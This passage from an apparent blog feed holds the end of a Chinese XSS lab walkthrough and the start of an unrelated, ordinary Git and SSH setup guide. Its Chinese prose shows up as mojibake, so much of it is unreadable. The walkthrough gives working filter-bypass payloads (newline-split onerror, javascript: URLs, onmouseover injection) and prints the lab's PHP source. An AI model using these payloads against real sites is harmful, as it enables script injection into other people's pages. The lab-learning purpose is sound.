<h3 id="æ¢è¡Œç¬¦ç»•è¿‡"><a href="#æ¢è¡Œç¬¦ç»•è¿‡" class="headerlink" title="*æ¢è¡Œç¬¦ç»•è¿‡"></a>*æ¢è¡Œç¬¦ç»•è¿‡</h3><p>åœ¨ XSS æ”»å‡»ä¸­ï¼Œ<strong>æ¢è¡Œç¬¦ç»•è¿‡è¿‡æ»¤</strong>çš„æ ¸å¿ƒåŸç†æ˜¯åˆ©ç”¨æµè§ˆå™¨ä¸è¿‡æ»¤è§„åˆ™å¯¹æ¢è¡Œç¬¦ï¼ˆ<code>\n</code> æˆ– <code>%0A</code>ï¼‰çš„è§£æå·®å¼‚ï¼Œä½¿å¾—æ¶æ„ä»£ç èƒ½å¤Ÿç»•è¿‡å®‰å…¨æ£€æµ‹ï¼ŒåŒæ—¶è¢«æµè§ˆå™¨æ­£å¸¸æ‰§è¡Œã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†è§£é‡Šå’Œåº”ç”¨åœºæ™¯ï¼š</p>
<p>ç»•è¿‡åŸç†ï¼š</p>
<ol>
<li><p><strong>æµè§ˆå™¨ä¸è¿‡æ»¤è§„åˆ™å¯¹æ¢è¡Œç¬¦çš„è§£æå·®å¼‚</strong>  </p>
<ul>
<li><strong>æµè§ˆå™¨</strong>ï¼šåœ¨ HTML ä¸­ï¼Œæ ‡ç­¾å±æ€§ä¹‹é—´çš„æ¢è¡Œç¬¦é€šå¸¸ä¼šè¢«è§†ä¸º<strong>æ™®é€šç©ºæ ¼</strong>ï¼Œç”šè‡³åœ¨æŸäº›æƒ…å†µä¸‹è¢«ç›´æ¥å¿½ç•¥ã€‚  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span></span></span><br><span class="line"><span class="tag">   <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- ç­‰åŒäº &lt;img src=x onerror=alert(1)&gt; --&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>è¿‡æ»¤è§„åˆ™</strong>ï¼šå¯èƒ½æœªæ­£ç¡®å¤„ç†æ¢è¡Œç¬¦ï¼Œä¾‹å¦‚ï¼š  <ul>
<li>ä»…æ£€æµ‹è¿ç»­çš„å…³é”®å­—ï¼ˆå¦‚ <code>onerror</code>ï¼‰ï¼Œä½†æ¢è¡Œç¬¦å°†å…³é”®å­—æ‹†åˆ†ä¸º <code>on\nerror</code> æ—¶ï¼Œç»•è¿‡é»‘åå•ã€‚  </li>
<li>è¿‡æ»¤ç©ºæ ¼ä½†æœªè¿‡æ»¤æ¢è¡Œç¬¦ï¼Œå¯¼è‡´æ¢è¡Œç¬¦æˆä¸ºæ›¿ä»£åˆ†éš”ç¬¦ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>æ··æ·†ä»£ç ç»“æ„</strong><br>é€šè¿‡æ¢è¡Œç¬¦æ”¹å˜ä»£ç çš„è§†è§‰ç»“æ„ï¼Œä½¿é™æ€æ­£åˆ™è¡¨è¾¾å¼æˆ–ç®€å•å­—ç¬¦ä¸²åŒ¹é…å¤±æ•ˆã€‚ä¾‹å¦‚ï¼š  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x%0Aonerror</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- %0A æ˜¯ URL ç¼–ç çš„æ¢è¡Œç¬¦ --&gt;</span></span><br></pre></td></tr></table></figure>
<p>åº”ç”¨åœºæ™¯ï¼š</p>
</li>
<li><p><strong>ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</strong></p>
</li>
</ol>
<ul>
<li><strong>åœºæ™¯</strong>ï¼šç›®æ ‡è¿‡æ»¤äº†ç©ºæ ¼ï¼ˆå¦‚åˆ é™¤æˆ–è½¬ä¹‰ä¸º <code>&amp;nbsp;</code>ï¼‰ï¼Œä½†å…è®¸æ¢è¡Œç¬¦ã€‚  </li>
<li><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼šç”¨æ¢è¡Œç¬¦ï¼ˆ<code>%0A</code>ï¼‰æ›¿ä»£ç©ºæ ¼åˆ†éš”æ ‡ç­¾å±æ€§ã€‚  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img/src=x%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>æµè§ˆå™¨è§£æä¸º <code>&lt;img src=x onerror=alert(1)&gt;</code>ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p><strong>åˆ†å‰²å…³é”®å­—</strong></p>
<ul>
<li><strong>åœºæ™¯</strong>ï¼šç›®æ ‡ä½¿ç”¨é»‘åå•æ£€æµ‹è¿ç»­çš„å…³é”®å­—ï¼ˆå¦‚ <code>onerror</code>ï¼‰ã€‚  </li>
<li><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼šæ’å…¥æ¢è¡Œç¬¦æ‹†åˆ†å…³é”®å­—ï¼Œä½¿å…¶æ— æ³•è¢«æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerr</span></span></span><br><span class="line"><span class="tag"><span class="attr">or</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>æµè§ˆå™¨ä¼šå°†æ¢è¡Œåçš„å†…å®¹åˆå¹¶ä¸º <code>onerror</code>ï¼Œä½†è¿‡æ»¤è§„åˆ™å¯èƒ½å› æ¢è¡Œç¬¦å¤±æ•ˆã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>ç»•è¿‡å±æ€§å€¼é—­åˆæ£€æµ‹</strong></p>
<ul>
<li><strong>åœºæ™¯</strong>ï¼šç›®æ ‡æ£€æŸ¥å±æ€§å€¼çš„é—­åˆï¼ˆå¦‚ <code>&quot;</code> æˆ– <code>&#39;</code>ï¼‰ï¼Œä½†æœªå¤„ç†æ¢è¡Œç¬¦ã€‚  </li>
<li><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼šåœ¨å±æ€§ä¸­æ’å…¥æ¢è¡Œç¬¦ï¼Œæ„é€ æœªé—­åˆçš„ä¸Šä¸‹æ–‡ï¼š  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascri%0Apt:alert(1)&quot;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>æµè§ˆå™¨å¯èƒ½å¿½ç•¥æ¢è¡Œç¬¦ï¼Œè§£æä¸º <code>javascript:alert(1)</code>ã€‚</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>å®é™…ç»•è¿‡ç¤ºä¾‹ï¼š</p>
<p>ç¤ºä¾‹ 1ï¼šç»•è¿‡ç©ºæ ¼è¿‡æ»¤<br>å‡è®¾ç›®æ ‡è¿‡æ»¤ç©ºæ ¼ï¼Œä½†å…è®¸æ¢è¡Œç¬¦ï¼š  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img/src=x%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>æµè§ˆå™¨è§£æ</strong>ï¼š<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code>  </li>
<li><strong>ç»•è¿‡æ•ˆæœ</strong>ï¼šæˆåŠŸè§¦å‘ <code>onerror</code> äº‹ä»¶ã€‚</li>
</ul>
<p>ç¤ºä¾‹ 2ï¼šåˆ†å‰²æ•æ„Ÿå…³é”®å­—<br>å‡è®¾ç›®æ ‡è¿‡æ»¤ <code>onerror</code> å…³é”®è¯ï¼š  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerr</span></span></span><br><span class="line"><span class="tag"><span class="attr">or</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">å³ <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x%0Aonerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>æµè§ˆå™¨è§£æ</strong>ï¼š<code>onerror</code> è¢«åˆå¹¶ï¼Œè§¦å‘äº‹ä»¶ã€‚  </li>
<li><strong>è¿‡æ»¤è§„åˆ™</strong>ï¼šå¯èƒ½å› æ¢è¡Œç¬¦æ— æ³•æ£€æµ‹åˆ° <code>onerror</code>ã€‚</li>
</ul>
<hr>
<p>ç”±äºscriptä¼šè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸ä½¿ç”¨<br>è¾“å…¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img%0Asrc=x%0Aonerror=alert(&#x27;123&#x27;)&gt;    ä¸ç”¨åŒå¼•å·ï¼Œå› ä¸ºè¢«å®ä¾‹åŒ–è½¬ä¹‰</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸé€šå…³</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level16&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level16&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="comment">//å¤šä¸ªæ›¿æ¢è¿‡æ»¤  åç«¯è¿‡æ»¤äº†ç©ºæ ¼-&gt;&amp;nbsp;  æœªè¿‡æ»¤æ¢è¡Œç¬¦</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str5</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>è§£é¢˜æ€è·¯ï¼š</p>
<p>æ£€æŸ¥æºç ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_59.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>ä¿®æ”¹åœ°å€æ çš„b,æºç ä¹Ÿå¯¹åº”ä¿®æ”¹ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_60.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<h3 id="è¶£äº‹-2"><a href="#è¶£äº‹-2" class="headerlink" title="*è¶£äº‹"></a>*è¶£äº‹</h3><p>å°†bä¿®æ”¹ä¸ºï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">123 onclick=alert()</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_61.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>onclick æˆä¸€ä¸ªå±æ€§</li>
</ul>
<p>è¾“å…¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">123 onmouseover=alert(&quot;123&quot;)</span><br></pre></td></tr></table></figure>

<p>é¼ æ ‡æ‚¬æ”¾å³å¯é€šå…³</p>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level17&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level17&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//å˜é‡è·å–ä¹‹åï¼Œæ²¡æœ‰ç»è¿‡è¿‡æ»¤å°±æ‹¼æ¥</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h2 align=center&gt;æˆåŠŸåï¼Œ&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;ç‚¹æˆ‘è¿›å…¥ä¸‹ä¸€å…³&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="æœåŠ¡å™¨è®¾ç½®"><a href="#æœåŠ¡å™¨è®¾ç½®" class="headerlink" title="æœåŠ¡å™¨è®¾ç½®"></a>æœåŠ¡å™¨è®¾ç½®</h1><p>å¼€å¯phpæ‰©å±•è®¾ç½®php_exif  â€“&gt;å›¾ç‰‡è¯»å–åŠŸèƒ½</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>Web</category>
        <category>XSSæ¼æ´</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Git-Note</title>
    <url>/2024/12/10/git_note/</url>
    <content><![CDATA[<h1 id="Git-æ“ä½œæŒ‡å—ï¼ˆç»ˆææ•´åˆç‰ˆï¼‰"><a href="#Git-æ“ä½œæŒ‡å—ï¼ˆç»ˆææ•´åˆç‰ˆï¼‰" class="headerlink" title="Git æ“ä½œæŒ‡å—ï¼ˆç»ˆææ•´åˆç‰ˆï¼‰"></a>Git æ“ä½œæŒ‡å—ï¼ˆç»ˆææ•´åˆç‰ˆï¼‰</h1><h2 id="ä¸€ã€åŸºç¡€å‘½ä»¤"><a href="#ä¸€ã€åŸºç¡€å‘½ä»¤" class="headerlink" title="ä¸€ã€åŸºç¡€å‘½ä»¤"></a>ä¸€ã€åŸºç¡€å‘½ä»¤</h2><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>åŠŸèƒ½è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>git init</code></td>
<td>åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ Git ä»“åº“</td>
</tr>
<tr>
<td><code>git log</code></td>
<td>æŸ¥çœ‹æäº¤å†å²</td>
</tr>
<tr>
<td><code>git add [æ–‡ä»¶å]</code></td>
<td>å°†æ–‡ä»¶æ·»åŠ åˆ°æš‚å­˜åŒºï¼ˆ<code>git add .</code> æ·»åŠ æ‰€æœ‰ä¿®æ”¹ï¼‰</td>
</tr>
<tr>
<td><code>git commit -m &quot;æäº¤ä¿¡æ¯&quot;</code></td>
<td>æäº¤æš‚å­˜åŒºçš„æ›´æ”¹åˆ°æœ¬åœ°ä»“åº“</td>
</tr>
<tr>
<td><code>git status</code></td>
<td>æŸ¥çœ‹å½“å‰ä»“åº“çŠ¶æ€ï¼ˆä¿®æ”¹ã€æš‚å­˜ã€æäº¤æƒ…å†µï¼‰</td>
</tr>
</tbody></table>
<h2 id="äºŒã€è¿œç¨‹ä»“åº“ç®¡ç†"><a href="#äºŒã€è¿œç¨‹ä»“åº“ç®¡ç†" class="headerlink" title="äºŒã€è¿œç¨‹ä»“åº“ç®¡ç†"></a>äºŒã€è¿œç¨‹ä»“åº“ç®¡ç†</h2><h3 id="æ·»åŠ -ç®¡ç†è¿œç¨‹ä»“åº“"><a href="#æ·»åŠ -ç®¡ç†è¿œç¨‹ä»“åº“" class="headerlink" title="æ·»åŠ &#x2F;ç®¡ç†è¿œç¨‹ä»“åº“"></a>æ·»åŠ &#x2F;ç®¡ç†è¿œç¨‹ä»“åº“</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ·»åŠ è¿œç¨‹ä»“åº“</span></span><br><span class="line">git remote add origin [ä»“åº“åœ°å€]</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPS æ–¹å¼</span></span><br><span class="line">git remote add origin https://github.com/ç”¨æˆ·å/ä»“åº“.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH æ–¹å¼</span></span><br><span class="line">git remote add origin git@github.com:ç”¨æˆ·å/ä»“åº“.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹è¿œç¨‹ä»“åº“åœ°å€</span></span><br><span class="line">git remote set-url origin [æ–°åœ°å€]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å·²é…ç½®çš„è¿œç¨‹ä»“åº“</span></span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

<h3 id="å…‹éš†ä»“åº“"><a href="#å…‹éš†ä»“åº“" class="headerlink" title="å…‹éš†ä»“åº“"></a>å…‹éš†ä»“åº“</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># HTTPS æ–¹å¼</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ä½ çš„GitHubç”¨æˆ·å/ä»“åº“å.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH æ–¹å¼</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:ä½ çš„GitHubç”¨æˆ·å/ä»“åº“å.git</span><br></pre></td></tr></table></figure>

<h2 id="ä¸‰ã€å¤šè®¾å¤‡åŒæ­¥å·¥ä½œæµ"><a href="#ä¸‰ã€å¤šè®¾å¤‡åŒæ­¥å·¥ä½œæµ" class="headerlink" title="ä¸‰ã€å¤šè®¾å¤‡åŒæ­¥å·¥ä½œæµ"></a>ä¸‰ã€å¤šè®¾å¤‡åŒæ­¥å·¥ä½œæµ</h2><h3 id="æ ¸å¿ƒé€»è¾‘"><a href="#æ ¸å¿ƒé€»è¾‘" class="headerlink" title="æ ¸å¿ƒé€»è¾‘"></a>æ ¸å¿ƒé€»è¾‘</h3><ul>
<li>å¤šå°ç”µè„‘å…±äº«åŒä¸€ä¸ª GitHub è¿œç¨‹ä»“åº“ä½œä¸ºâ€ä¸­å¤®å­˜å‚¨â€</li>
<li>ä»»æ„ç”µè„‘ä¿®æ”¹åé€šè¿‡ <code>git push</code> æ¨é€åˆ° GitHub</li>
<li>å…¶ä»–ç”µè„‘é€šè¿‡ <code>git pull</code> æ‹‰å–æœ€æ–°ä¿®æ”¹</li>
</ul>
<h3 id="æ“ä½œæ­¥éª¤"><a href="#æ“ä½œæ­¥éª¤" class="headerlink" title="æ“ä½œæ­¥éª¤"></a>æ“ä½œæ­¥éª¤</h3><h4 id="1-åœ¨æ–°è®¾å¤‡ä¸Šæ‹‰å–ä»“åº“"><a href="#1-åœ¨æ–°è®¾å¤‡ä¸Šæ‹‰å–ä»“åº“" class="headerlink" title="1. åœ¨æ–°è®¾å¤‡ä¸Šæ‹‰å–ä»“åº“"></a>1. åœ¨æ–°è®¾å¤‡ä¸Šæ‹‰å–ä»“åº“</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:ç”¨æˆ·å/ä»“åº“.git  <span class="comment"># SSHæ–¹å¼</span></span><br><span class="line"><span class="comment"># æˆ–</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ç”¨æˆ·å/ä»“åº“.git  <span class="comment"># HTTPSæ–¹å¼</span></span><br></pre></td></tr></table></figure>

<h4 id="2-ä¿®æ”¹å¹¶æ¨é€ä»£ç "><a href="#2-ä¿®æ”¹å¹¶æ¨é€ä»£ç " class="headerlink" title="2. ä¿®æ”¹å¹¶æ¨é€ä»£ç "></a>2. ä¿®æ”¹å¹¶æ¨é€ä»£ç </h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .          <span class="comment"># æ·»åŠ ä¿®æ”¹</span></span><br><span class="line">git commit -m <span class="string">&quot;æè¿°&quot;</span> <span class="comment"># æäº¤æ›´æ”¹</span></span><br><span class="line">git push origin main  <span class="comment"># æ¨é€åˆ°è¿œç¨‹</span></span><br></pre></td></tr></table></figure>

<h4 id="3-åŒæ­¥æœ€æ–°ä»£ç "><a href="#3-åŒæ­¥æœ€æ–°ä»£ç " class="headerlink" title="3. åŒæ­¥æœ€æ–°ä»£ç "></a>3. åŒæ­¥æœ€æ–°ä»£ç </h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull origin main  <span class="comment"># æ‹‰å–å¹¶åˆå¹¶è¿œç¨‹æ›´æ”¹</span></span><br></pre></td></tr></table></figure>

<h2 id="å››ã€SSH-é…ç½®ä¸é—®é¢˜è§£å†³"><a href="#å››ã€SSH-é…ç½®ä¸é—®é¢˜è§£å†³" class="headerlink" title="å››ã€SSH é…ç½®ä¸é—®é¢˜è§£å†³"></a>å››ã€SSH é…ç½®ä¸é—®é¢˜è§£å†³</h2><h3 id="æ ¸å¿ƒæ­¥éª¤"><a href="#æ ¸å¿ƒæ­¥éª¤" class="headerlink" title="æ ¸å¿ƒæ­¥éª¤"></a>æ ¸å¿ƒæ­¥éª¤</h3><p>ç¡®è®¤å¯†é’¥æ·»åŠ æ­£ç¡® â†’ é…ç½® SSH è¯†åˆ«å¯†é’¥ â†’ ä¿®å¤æ–‡ä»¶æƒé™</p>
<h4 id="1-ç¡®è®¤å…¬é’¥æ·»åŠ åˆ°-GitHub"><a href="#1-ç¡®è®¤å…¬é’¥æ·»åŠ åˆ°-GitHub" class="headerlink" title="1. ç¡®è®¤å…¬é’¥æ·»åŠ åˆ° GitHub"></a>1. ç¡®è®¤å…¬é’¥æ·»åŠ åˆ° GitHub</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å…¬é’¥å†…å®¹</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub    <span class="comment"># é»˜è®¤å¯†é’¥</span></span><br><span class="line"><span class="comment"># æˆ–</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/è‡ªå®šä¹‰å¯†é’¥å.pub  <span class="comment"># è‡ªå®šä¹‰å¯†é’¥</span></span><br></pre></td></tr></table></figure>
<ul>
<li>å¤åˆ¶å®Œæ•´æ–‡æœ¬ï¼ˆä» <code>ssh-rsa</code> å¼€å¤´åˆ°é‚®ç®±ç»“å°¾ï¼‰</li>
<li>GitHub â†’ Settings â†’ SSH and GPG keys â†’ æ·»åŠ æ–° Key</li>
</ul>
<h4 id="2-é…ç½®-SSH-è¯†åˆ«å¯†é’¥"><a href="#2-é…ç½®-SSH-è¯†åˆ«å¯†é’¥" class="headerlink" title="2. é…ç½® SSH è¯†åˆ«å¯†é’¥"></a>2. é…ç½® SSH è¯†åˆ«å¯†é’¥</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">notepad ~/.ssh/config</span><br></pre></td></tr></table></figure>
<p>ç²˜è´´é…ç½®ï¼ˆæ ¹æ®å®é™…æƒ…å†µä¿®æ”¹ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  HostName github.com</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile C:/Users/ä½ çš„ç”¨æˆ·å/.ssh/å¯†é’¥æ–‡ä»¶å</span><br></pre></td></tr></table></figure>
<blockquote>
<p>è·¯å¾„ä½¿ç”¨ <code>/</code> æˆ– <code>\\</code>ï¼Œä¾‹å¦‚ï¼š<code>C:/Users/å¼ ä¸‰/.ssh/id_rsa</code></p>
</blockquote>
<h4 id="3-ä¿®å¤å¯†é’¥æ–‡ä»¶æƒé™"><a href="#3-ä¿®å¤å¯†é’¥æ–‡ä»¶æƒé™" class="headerlink" title="3. ä¿®å¤å¯†é’¥æ–‡ä»¶æƒé™"></a>3. ä¿®å¤å¯†é’¥æ–‡ä»¶æƒé™</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 600 å¯†é’¥æ–‡ä»¶å      <span class="comment"># ç§é’¥æƒé™</span></span><br><span class="line"><span class="built_in">chmod</span> 644 å¯†é’¥æ–‡ä»¶å.pub  <span class="comment"># å…¬é’¥æƒé™</span></span><br></pre></td></tr></table></figure>

<h4 id="4-æµ‹è¯•è¿æ¥"><a href="#4-æµ‹è¯•è¿æ¥" class="headerlink" title="4. æµ‹è¯•è¿æ¥"></a>4. æµ‹è¯•è¿æ¥</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line"><span class="comment"># æˆåŠŸæ˜¾ç¤ºï¼šHi ç”¨æˆ·å! You&#x27;ve successfully authenticated...</span></span><br></pre></td></tr></table></figure>

